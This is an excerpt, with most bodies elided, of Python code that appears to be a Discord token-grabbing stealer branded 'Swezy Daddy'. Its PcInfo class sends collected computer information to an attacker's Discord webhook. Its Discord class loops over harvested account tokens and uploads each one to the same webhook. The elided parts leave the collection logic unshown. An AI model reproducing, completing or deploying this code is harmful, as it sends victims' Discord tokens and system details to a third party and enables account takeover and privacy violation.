...
def main(webhook: str):
    ...
    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1049731215890075748/1052585788262596648/Bild_2022-10-12_200709819-removebg-preview.png", username="Swezy Daddy")
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Swezy Daddy", color=10038562)
        ...
        embed.add_field(
            ...
            inline=False)
        embed.set_footer(text="Swezy <3")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1049731215890075748/1052585788262596648/Bild_2022-10-12_200709819-removebg-preview.png")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1049731215890075748/1052585788262596648/Bild_2022-10-12_200709819-removebg-preview.png", username="Swezy Daddy")
...
class Discord:
    ...
    def upload(self, webhook):
        ...
        for token in self.tokens:
            ...
            webhook.send(
                embed=embed,
                avatar_url="https://cdn.discordapp.com/attachments/1049731215890075748/1052585788262596648/Bild_2022-10-12_200709819-removebg-preview.png",
